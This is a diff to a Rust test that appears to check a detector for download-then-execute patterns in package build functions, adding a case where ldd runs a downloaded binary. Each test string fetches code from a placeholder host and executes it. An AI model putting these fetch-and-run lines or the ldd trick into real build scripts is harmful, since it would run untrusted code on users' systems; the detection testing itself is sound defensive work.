@@ -206,6 +206,9 @@ async fn download_then_execute_file() {
         "package() {\n  curl -o ~/.x http://e.example/x; bash ~/.x\n}",
         "package() {\n  f=/tmp/f\n  curl -o $f http://e.example/x\n  bash $f\n}",
         "package() {\n  wget -O f http://e.example/x\n  chmod +x f\n  ./f\n}",
+        // ldd runs its target through the dynamic loader, so "inspecting" a
+        // downloaded binary with it executes that binary.
+        "package() {\n  curl -o t http://e.example/x\n  ldd ./t\n}",
         "package() {\n  curl -fsSLo f http://e.example/x && . ./f\n}",
         "package() {\n  curl -O http://e.example/x.sh\n  bash x.sh\n}",
     ] {
